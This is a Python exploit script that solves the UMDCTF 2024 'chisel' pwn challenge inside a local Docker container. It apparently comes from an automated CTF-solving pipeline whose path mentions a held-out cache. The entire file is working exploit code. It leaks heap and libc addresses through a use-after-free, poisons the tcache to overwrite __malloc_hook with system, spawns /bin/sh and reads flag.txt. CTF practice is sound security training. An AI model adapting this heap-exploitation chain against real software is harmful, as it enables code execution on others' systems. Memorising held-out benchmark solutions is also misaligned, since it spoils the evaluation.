#!/usr/bin/env python3
from __future__ import annotations

import argparse
import os
import re
import select
import subprocess
import time
import uuid
from pathlib import Path
from typing import NamedTuple


LIBC_LEAK_DELTA = 0x1E0C00
MALLOC_HOOK_OFFSET = 0x1E0B90
SYSTEM_OFFSET = 0x4FA60
BINSH_OFFSET = 0x1ABF05


class Layout(NamedTuple):
    heap_base: int
    libc_base: int
    malloc_hook: int
    system: int
    binsh: int
    tcache_mask: int


class ChiselProcess:
    def __init__(self, challenge_dir: Path, image: str, timeout: float = 8.0) -> None:
        self.challenge_dir = challenge_dir
        self.timeout = timeout
        self.container_name = f"forgeflag-chisel-{uuid.uuid4().hex[:12]}"
        self.buffer = b""
        self.process = subprocess.Popen(
            build_docker_command(challenge_dir, image, self.container_name),
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
        )

    def close(self) -> None:
        if self.process.poll() is None:
            self.process.kill()
        try:
            self.process.wait(timeout=3)
        except subprocess.TimeoutExpired:
            self.process.terminate()
        subprocess.run(["docker", "rm", "-f", self.container_name], capture_output=True, check=False, text=True, timeout=10)

    def sendline(self, text: str | int) -> None:
        assert self.process.stdin is not None
        self.process.stdin.write(str(text).encode("ascii") + b"\n")
        self.process.stdin.flush()

    def read_until(self, token: bytes, timeout: float | None = None) -> bytes:
        deadline = time.time() + (timeout or self.timeout)
        while token not in self.buffer and time.time() < deadline:
            assert self.process.stdout is not None
            ready, _, _ = select.select([self.process.stdout], [], [], 0.1)
            if ready:
                chunk = os.read(self.process.stdout.fileno(), 4096)
                if not chunk:
                    break
                self.buffer += chunk
        if token not in self.buffer:
            raise TimeoutError(f"timed out waiting for {token!r}; tail={self.buffer[-1000:]!r}")
        end = self.buffer.index(token) + len(token)
        output = self.buffer[:end]
        self.buffer = self.buffer[end:]
        return output

    def read_available(self, timeout: float = 2.0) -> bytes:
        deadline = time.time() + timeout
        while time.time() < deadline:
            assert self.process.stdout is not None
            ready, _, _ = select.select([self.process.stdout], [], [], 0.1)
            if ready:
                chunk = os.read(self.process.stdout.fileno(), 4096)
                if not chunk:
                    break
                self.buffer += chunk
        output = self.buffer
        self.buffer = b""
        return output


def build_docker_command(challenge_dir: Path, image: str, container_name: str) -> list[str]:
    return [
        "docker",
        "run",
        "--rm",
        "--name",
        container_name,
        "--platform",
        "linux/amd64",
        "-i",
        "-v",
        f"{challenge_dir.resolve()}:/chal",
        "-w",
        "/chal",
        image,
        "bash",
        "-lc",
        "./ld-linux-x86-64.so.2 --library-path . ./chisel",
    ]


def derive_layout(heap_leak: int, libc_leak: int) -> Layout:
    heap_base = heap_leak << 12
    libc_base = libc_leak - LIBC_LEAK_DELTA
    return Layout(
        heap_base=heap_base,
        libc_base=libc_base,
        malloc_hook=libc_base + MALLOC_HOOK_OFFSET,
        system=libc_base + SYSTEM_OFFSET,
        binsh=libc_base + BINSH_OFFSET,
        tcache_mask=heap_base >> 12,
    )


def poisoned_tcache_value(layout: Layout) -> int:
    return layout.tcache_mask ^ layout.malloc_hook


def extract_flags(text: str) -> list[str]:
    return re.findall(r"UMDCTF\{[^}\r\n]+\}", text)


def alloc(proc: ChiselProcess, size: int) -> None:
    proc.read_until(b"> ")
    proc.sendline(1)
    proc.read_until(b"size: ")
    proc.sendline(size)


def free(proc: ChiselProcess) -> None:
    proc.read_until(b"> ")
    proc.sendline(2)


def edit(proc: ChiselProcess, value: int) -> None:
    proc.read_until(b"> ")
    proc.sendline(3)
    proc.read_until(b"data: ")
    proc.sendline(value)


def show(proc: ChiselProcess) -> int:
    proc.read_until(b"> ")
    proc.sendline(4)
    proc.read_until(b"data: ")
    line = proc.read_until(b"\n")
    return int(line.strip())


def chisel(proc: ChiselProcess) -> None:
    proc.read_until(b"> ")
    proc.sendline(5)


def solve(challenge_dir: Path, image: str = "debian:bookworm") -> dict[str, object]:
    for required in ("chisel", "libc.so.6", "ld-linux-x86-64.so.2"):
        if not (challenge_dir / required).exists():
            raise FileNotFoundError(f"missing {required} under {challenge_dir}")

    proc = ChiselProcess(challenge_dir, image=image)
    try:
        alloc(proc, 24)
        free(proc)
        heap_leak = show(proc)
        alloc(proc, 24)

        alloc(proc, 0x440 - 8)
        chisel(proc)
        free(proc)
        libc_leak = show(proc)
        layout = derive_layout(heap_leak, libc_leak)

        alloc(proc, 0x460 - 8)
        chisel(proc)
        free(proc)
        alloc(proc, 0x480 - 8)
        chisel(proc)
        free(proc)

        alloc(proc, 0x420 - 8)
        alloc(proc, 0x440 - 8)
        alloc(proc, 0x460 - 8)
        chisel(proc)

        alloc(proc, 24)
        free(proc)
        edit(proc, poisoned_tcache_value(layout))
        alloc(proc, 24)
        alloc(proc, 24)
        edit(proc, layout.system)
        alloc(proc, layout.binsh)
        time.sleep(0.2)
        proc.sendline("cat flag.txt; echo FORGEFLAG_DONE")
        output = proc.read_available(timeout=3.0).decode(errors="replace")
        return {
            "binary": str(challenge_dir / "chisel"),
            "heap_leak": heap_leak,
            "libc_leak": libc_leak,
            "heap_base": layout.heap_base,
            "libc_base": layout.libc_base,
            "malloc_hook": layout.malloc_hook,
            "system": layout.system,
            "binsh": layout.binsh,
            "poisoned_tcache": poisoned_tcache_value(layout),
            "stdout": output,
            "flags": extract_flags(output),
        }
    finally:
        proc.close()


def main() -> int:
    parser = argparse.ArgumentParser(description="Replay UMDCTF chisel through local Docker amd64 heap/tcache poisoning.")
    parser.add_argument("--challenge-dir", type=Path, default=Path(".forgeflag/heldout-cache/umdctf2024/pwn/chisel"))
    parser.add_argument("--image", default="debian:bookworm")
    args = parser.parse_args()

    result = solve(args.challenge_dir, image=args.image)
    print("challenge: chisel")
    print("method: glibc 2.27 tcache poisoning via UAF arbitrary write into __malloc_hook")
    print(f"binary: {result['binary']}")
    for key in ("heap_leak", "libc_leak", "heap_base", "libc_base", "malloc_hook", "system", "binsh", "poisoned_tcache"):
        print(f"{key}: {hex(int(result[key]))}")
    print("proof: __malloc_hook overwritten with system and malloc('/bin/sh') reads flag.txt from the running challenge")
    print("service_output:")
    print(str(result["stdout"]).strip())
    flags = result["flags"]
    if not flags:
        return 1
    for flag in flags:
        print(f"flag: {flag}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
